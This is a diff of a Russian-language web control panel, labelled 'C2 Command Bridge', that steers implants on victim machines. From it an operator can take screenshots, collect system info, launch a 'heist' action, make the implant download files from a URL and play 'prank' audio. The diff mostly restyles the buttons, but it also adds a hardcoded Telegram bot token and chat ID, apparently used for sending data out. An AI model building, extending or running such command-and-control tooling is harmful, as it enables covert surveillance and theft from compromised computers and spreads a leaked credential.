@@ -1,21 +1,23 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия 5.4 - Финальный Гибрид) -->
+<!-- Файл: index.html (Версия 5.5 - "Строгий Костюм") -->
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>C2 Коммандный Мостик v5.4</title>
+  <title>C2 Коммандный Мостик v5.5</title>
   <style>
     :root {
       --bg-color: #1a1a1c; --primary-color: #2e2e33; --secondary-color: #45454d;
-      --text-color: #e1e1e1; --accent-color: #00aaff; --recon-color: #007bff;
-      --heist-color: #dc3545; --system-color: #6f42c1; --prank-color: #28a745;
-      --download-color: #ffc107; --error-color: #ff4d4d; --success-color: #33cc33;
+      --text-color: #e1e1e1; --accent-color: #00aaff;
+      /* --- НОВАЯ, СТРОГАЯ ПАЛИТРА --- */
+      --action-color: #007bff; /* Основной синий для всех действий */
+      --danger-color: #dc3545; /* Красный для опасных действий */
+      --error-color: #ff4d4d; --success-color: #33cc33;
     }
     html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); }
     .container { display: flex; flex-direction: column; height: 100%; }
     header { flex-shrink: 0; color: var(--accent-color); text-align: center; padding: 20px 0; border-bottom: 1px solid var(--secondary-color); }
-    h1, h2, h3 { margin: 0; }
+    h1, h2, h3 { margin: 0;}
     h2 { color: var(--accent-color); padding-bottom: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--secondary-color); }
     h3 { margin-top: 20px; margin-bottom: 10px; text-align: center; border-top: 1px solid var(--secondary-color); padding-top: 20px; }
     .app-layout { display: flex; flex-grow: 1; overflow: hidden; padding: 25px; gap: 25px; }
@@ -30,13 +32,18 @@
     .log-info { color: var(--text-color); }
     .log-success { color: var(--success-color); }
     .log-error { color: var(--error-color); }
-    .log-command { color: var(--download-color); }
+    .log-command { color: var(--accent-color); }
     .log-timestamp { color: var(--secondary-color); margin-right: 10px; }
-    footer { display: none; } /* Старый футер больше не нужен, его заменяет консоль */
+    footer { display: none; }
     button { color: white; padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 1em; font-weight: bold; width: 100%; transition: background-color 0.2s; box-sizing: border-box; }
     button:hover { filter: brightness(1.2); }
+
+    /* --- НОВЫЕ СТИЛИ КНОПОК --- */
     .btn-bot { background-color: #495057; }
     .btn-bot.selected { border: 3px solid var(--accent-color); background-color: #0056b3; }
+    .btn-action { background-color: var(--action-color); } /* Единый стиль для всех обычных кнопок */
+    .btn-danger { background-color: var(--danger-color); } /* Стиль для опасных кнопок */
+
     .grid-controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }
     .thumbnail-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; }
     .thumbnail-item { text-align: center; cursor: pointer; background-color: var(--secondary-color); padding: 10px; border-radius: 8px; }
@@ -49,7 +56,7 @@
 </head>
 <body>
   <div class="container">
-    <header><h1>Коммандный Мостик v5.4</h1></header>
+    <header><h1>Коммандный Мостик v5.5</h1></header>
 
     <main class="app-layout">
       <aside class="sidebar">
@@ -62,15 +69,16 @@
           <section>
             <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
             <div class="grid-controls">
-              <button onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
-              <button onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
-              <button onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
+              &lt;!-- ИЗМЕНЕНИЕ: Все кнопки теперь одного стиля -->
+              <button class="btn-action" onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
+              <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
+              <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
             </div>
           </section>
           <section>
             <h2>Загрузка новых файлов</h2>
             <input type="text" id="url-input" placeholder="URL файла (mp3, wav, jpg, png)...">
-            <button onclick="downloadFile()">Загрузить</button>
+            <button class="btn-action" onclick="downloadFile()">Загрузить</button>
           </section>
           <section>
             <h2>Пранки и Медиа</h2>
@@ -78,7 +86,7 @@
               <div>
                 <h3>Управление звуком</h3>
                 <input type="range" id="volume-slider" min="0" max="100" value="50">
-                <button style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
+                <button class="btn-action" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
               </div>
               <div>
                 <h3>Локальные звуки</h3>
@@ -101,15 +109,19 @@
 
   <script>
     // ==============================================================================
-    // JAVASCRIPT-МОЗГ (Твоя рабочая версия 2.0 + мой Кардиостимулятор и Логи)
+    // JAVASCRIPT-МОЗГ (Без изменений в логике, только в стилях)
     // ==============================================================================
     const ui = {
       botList: document.getElementById('bot-list'), controlsWrapper: document.getElementById('controls-wrapper'),
-      selectedBotName: document.getElementById('selected-bot-name'), logList: document.getElementById('log-list'), // <-- Логи вместо футера
+      selectedBotName: document.getElementById('selected-bot-name'), logList: document.getElementById('log-list'),
       audioFilesList: document.getElementById('audio-files-list'), imageFilesList: document.getElementById('image-files-list'),
-      volumeSlider: document.getElementById('volume-slider'), urlInput: document.getElementById('url-input'),
+      volumeSlider: document.getElementById('volume-slider'), muteButton: document.querySelector("button[onclick*='mute']"),
+      urlInput: document.getElementById('url-input'),
     };
     let socket, selectedBotId = null, pingInterval = null;
+
+    const TG_BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34";
+    const TG_CHAT_ID = "1640138978";
 
     function log(message, type = 'info') {
       const now = new Date();
@@ -125,7 +137,7 @@
       log("Подключение к C2...");
       if (pingInterval) clearInterval(pingInterval);
 
-      socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
+      socket = new WebSocket(`${window.location.protocol === 'https' ? 'wss' : 'ws'}://${window.location.host}/ws`);
 
       socket.onopen = () => {
         log("Соединение установлено.", "success");
@@ -136,12 +148,9 @@
       socket.onmessage = (event) => {
         if (event.data === 'pong') return;
         const msg = JSON.parse(event.data);
-
-        // Твоя старая, рабочая логика обработки сообщений
         if (msg.type === 'bot_list') { updateBotList(msg.data); }
         else if (msg.type === 'bot_details' && msg.bot_id === selectedBotId) { handleBotDetails(msg.data); }
         else if (msg.type === 'status') { log(`[${msg.bot_id.replace('implant_','')}] ${msg.data}`); }
-        // Добавим обработку обновлений, если сервер их пришлет
         else if (msg.type === 'volume_update' && msg.bot_id === selectedBotId) { if(msg.data) ui.volumeSlider.value = msg.data.level; }
         else if (msg.type === 'file_list_update' && msg.bot_id === selectedBotId) { if(msg.data.files) renderBotFiles(msg.data.files); }
       };
@@ -190,14 +199,22 @@
     function handleBotDetails(data) {
       log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
       if (data.files) renderBotFiles(data.files);
-      if (data.volume !== undefined) ui.volumeSlider.value = data.volume;
+      if (data.volume_state) updateVolumeUI(data.volume_state);
+      else if (data.volume !== undefined) ui.volumeSlider.value = data.volume;
+    }
+
+    function updateVolumeUI(state) {
+      ui.volumeSlider.value = state.level;
+      ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
+      ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
     }
 
     function renderBotFiles(files) {
       const audioContainer = ui.audioFilesList;
       audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
       if(files.audio) files.audio.forEach(file => {
-        const btn = document.createElement('button'); btn.textContent = file; btn.className = 'btn-prank';
+        const btn = document.createElement('button'); btn.textContent = file;
+        btn.className = 'btn-action'; // ИЗМЕНЕНИЕ: Единый стиль
         btn.onclick = () => sendCommand({ action: 'play', filename: file });
         audioContainer.appendChild(btn);
       });
@@ -217,18 +234,18 @@
 
     function sendCommand(payload) {
       if (!selectedBotId) return;
-      if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEISTНА ${selectedBotId.replace('implant_', '')}?`)) return;
+      if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
       socket.send(JSON.stringify({ type: 'command', target_id: selectedBotId, payload }));
       log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
     }
 
     const debounce = (func, delay) => { let timeout; return (...args) => { clearTimeout(timeout); timeout = setTimeout(() => func(...args), delay); }; };
-    const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 200);
+    const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 250);
     ui.volumeSlider.addEventListener('input', (event) => setVolume(event.target.value));
 
     function downloadFile() {
       const url = ui.urlInput.value.trim();
-      if (url) { sendCommand({ action: 'download', url }); ui.urlInput.value = ''; }
+      if (url) { sendCommand({ action: 'download', url }); }
     }
 
     connect();
